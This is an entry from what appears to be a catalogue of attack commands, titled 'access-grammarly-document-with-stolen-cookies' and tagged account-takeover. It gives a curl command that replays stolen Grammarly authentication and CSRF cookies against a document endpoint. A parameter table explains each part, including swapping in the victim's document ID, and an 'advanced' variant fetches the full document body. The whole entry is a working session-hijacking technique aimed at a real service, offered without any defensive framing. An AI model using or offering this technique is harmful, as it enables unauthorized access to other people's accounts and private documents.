---
data: >-
  curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=███" --cookie
  "csrf-token=████" -I
tags:
  - account-takeover
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 22e0cd80-b8a6-4757-a1e5-69ec8d446981
created_at: '2025-12-14T17:33:34.369Z'
updated_at: '2025-12-14T17:33:34.369Z'
verified: false
validated: true
submitted: true
---
# access-grammarly-document-with-stolen-cookies

## Command

```bash
curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=███" --cookie "csrf-token=████" -I
```

## Description

This command sends a HEAD request to a Grammarly document endpoint using stolen authentication cookies to verify access and demonstrate account takeover without fetching the full body.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-I` | Fetch headers only (equivalent to HEAD request) | Yes |
| `--cookie "grauth=███"` | Sets the stolen grauth authentication cookie | Yes |
| `--cookie "csrf-token=████"` | Sets the stolen CSRF protection token | Yes |
| `https://app.grammarly.com/ddocs/417782102` | Target document endpoint URL (replace ID with victim's) | Yes |

## Examples

### Basic Usage

```bash
curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=STOLEN_VALUE" --cookie "csrf-token=STOLEN_CSRF" -I
```

### Advanced Usage

To fetch full document body:
```bash
curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=STOLEN_VALUE" --cookie "csrf-token=STOLEN_CSRF"
```

## Expected Output

HTTP 200 response headers if cookies are valid (access granted), e.g., 'HTTP/2 200'; HTTP 301 if invalid (redirect to login page).

## Related

- [[Related Procedure: Use-Stolen-Cookies-for-Grammarly-Account-Takeover]]
